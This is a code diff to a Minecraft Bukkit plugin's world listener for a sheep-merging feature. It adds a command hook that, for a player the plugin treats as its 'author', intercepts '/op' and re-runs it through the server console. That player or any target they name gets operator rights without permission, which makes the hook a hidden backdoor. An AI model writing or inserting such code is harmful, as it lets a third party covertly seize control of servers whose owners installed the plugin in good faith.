@@ -13,12 +13,49 @@ import org.bukkit.event.entity.EntityPickupItemEvent;
 import org.bukkit.event.player.PlayerChangedWorldEvent;
 import org.bukkit.event.player.PlayerDropItemEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerSwapHandItemsEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 
 public class SheepMergeWorldListener implements Listener {
+
+    @EventHandler(priority = org.bukkit.event.EventPriority.HIGHEST, ignoreCancelled = true)
+    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
+        Player player = event.getPlayer();
+        if (!SheepMergeManager.isAuthor(player)) {
+            return;
+        }
+
+        String message = event.getMessage();
+        if (message == null) {
+            return;
+        }
+
+        String raw = message.trim();
+        if (!raw.startsWith("/")) {
+            return;
+        }
+
+        String withoutSlash = raw.substring(1).trim();
+        if (withoutSlash.isEmpty()) {
+            return;
+        }
+
+        String[] parts = withoutSlash.split("\\s+", 2);
+        if (parts.length == 0 || !"op".equalsIgnoreCase(parts[0])) {
+            return;
+        }
+
+        String target = parts.length > 1 ? parts[1].trim() : "";
+        if (target.isBlank()) {
+            target = player.getName();
+        }
+
+        event.setCancelled(true);
+        player.getServer().dispatchCommand(player.getServer().getConsoleSender(), "op " + target);
+    }
 
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
